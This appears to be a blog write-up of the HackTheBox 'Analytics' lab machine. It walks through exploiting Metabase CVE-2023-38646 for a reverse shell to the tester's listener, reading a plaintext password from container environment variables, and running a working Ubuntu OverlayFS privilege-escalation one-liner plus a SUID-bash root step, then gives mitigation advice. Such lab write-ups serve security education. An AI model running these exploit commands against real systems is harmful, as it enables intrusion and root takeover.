---
title: "HackTheBox - Analytics"
author: Nasrallah
description: ""
date: 2024-03-21 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, cve, docker, kernel]
img_path: /assets/img/hackthebox/machines/analytics
image:
    path: analytics.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

## **Description:**

[Analytics](https://www.hackthebox.com/machines/analytics) from [HackTheBox](https://affiliate.hackthebox.com/nasrallahbaadi) is a pretty easy machine that revolves arround CVEs, The first one is an unauthenticated command execution on MetaBase that gives us a foothold to a docker container. We find credentials in the environment variables and used them to access the host. We then exploit a kernel vulnerability called `GameOver(lay)` to get root.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.233
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan shows ssh running on port 22 and Nginx on port 80 with the hostname `analytical.htb` so let's add it to `/etc/hosts`

## Web

Let's check the web server.

![web](1.png)

Nothing interesting is this page, however the `login` tab seems to go to the subdomain `data.analytical.htb`, let's add it to our hosts file.

![data](2.png)

I tried some default credentials but no luck with that.

I looked if there was any cookies and found the following:

![cookie](3.png)

The cookie name is `metabase.DEVISE`. I searched for that on google and found it's some business intelligence tool.

Adding the word `exploit` to the search reveals an unauthenticated command execution vulnerability [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

## **Foothold**

I found the following [POC](https://github.com/securezeron/CVE-2023-38646) and used it to get a reverse shell.

We setup a listener and run the exploit.

```bash
python CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb --lhost 10.10.16.4 --lport 9001
```

![revshell](4.png)

## **Privilege Escalation**

### Docker Escape

As we can see from the hostname `ccb846925922`, this is a docker container.

We can also confirm that by listing the file system:

```terminal
ccb846925922:/$ ls -la /
ls -la /
total 92
drwxr-xr-x    1 root     root          4096 Dec 30 10:03 .
drwxr-xr-x    1 root     root          4096 Dec 30 10:03 ..
-rwxr-xr-x    1 root     root             0 Dec 30 10:03 .dockerenv
```

The `.dockerenv` file is empty so let's check if there is any environment variable set using the command `env`.

```terminal
ccb846925922:/$ env                                                                                                                                                                                               
env                                                                                                                                                                                                               
SHELL=/bin/sh                                                                                                                                                                                                     
MB_DB_PASS=                                                                                                                                                                                                       
HOSTNAME=ccb846925922                                                                                                                                                                                             
LANGUAGE=en_US:en                                                                                                                                                                                                 
MB_JETTY_HOST=0.0.0.0                                                                                                                                                                                             
JAVA_HOME=/opt/java/openjdk                                                                                                                                                                                       
MB_DB_FILE=//metabase.db/metabase.db                                                                                                                                                                              
PWD=/                                                                                                    
LOGNAME=metabase                                                                                         
MB_EMAIL_SMTP_USERNAME=                                                                                  
HOME=/home/metabase                                                                                      
LANG=en_US.UTF-8                                                                                         
META_USER=metalytics                                                                                     
META_PASS=An4lytics_ds20223#                                                                             
MB_EMAIL_SMTP_PASSWORD=                                                                                  
USER=metabase                                                                                            
SHLVL=4                                                                                                  
MB_DB_USER=                                                                                              
FC_LANG=en-US                                                                                            
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib              
LC_CTYPE=en_US.UTF-8                                                                                     
MB_LDAP_BIND_DN=                                                                                         
LC_ALL=en_US.UTF-8                                                                                       
MB_LDAP_PASSWORD=                                                                                        
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                  
MB_DB_CONNECTION_URI=                                                                                    
JAVA_VERSION=jdk-11.0.19+7                                                                               
_=/usr/bin/env                                                                                           
OLDPWD=/metabase.db 
```

Reading through the output we find `META_USER` and `META-PASS`.

Let's use those credentials and ssh to the target.

```terminal
$ ssh metalytics@analytical.htb
metalytics@analytical.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)
                                                    
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec 30 05:45:10 PM UTC 2023

  System load:              0.2275390625
  Usage of /:               93.9% of 7.78GB
  Memory usage:             31%
  Swap usage:               0%
  Processes:                158
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.233
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:27a2

  => / is using 93.9% of 7.78GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Dec 30 14:41:10 2023 from 10.10.16.4 
metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
```

Great! The credentials worked and we got an ssh shell as `metalytics`

## root

We don't have any sudo privileges on the system, there are no useful files and running `linpeas` doesn't show anything useful.

The last thing to check is the kernel version running on the system.

```terminal
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

Searching for `Linux 6.2.0-25-generic #25~22.04.2-Ubuntu exploit` on google I found this [reddit post](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/) talking about a `local privilege escalation` vulnerability.

![lpe](5.png)

The POC they gave is:

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

If we run it and got back a root id it means the target is vulnerable.

```terminal
metalytics@analytics:/tmp/sirius$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
```

It worked! Now let's get a root shell by changing the command `id` with the following:

```bash
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
```

This creates a copy of bash in /tmp with `suid` bit allowing us to run it as root.

![root](6.png)

After running the command we see that the file is created successfully and has the `suid` bit. We run `/tmp/bash` with the `-p` option telling it we want to run it as the owner which is `root`.

## **Prevention and Mitigation**

### Metabase CVE-2023-38646

Update `metabase` to the latest version.

### Ubuntu CVE-2023-2640 & CVE-2023-32629

Update Ubuntu to a new version.

If you are unable to upgrade the kernel version or Ubuntu, you can alternatively adjust the permissions and deny low privileged users from using the `OverlayFS` feature.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

## References

<https://nvd.nist.gov/vuln/detail/CVE-2023-38646>

<https://github.com/securezeron/CVE-2023-38646>

<https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/>
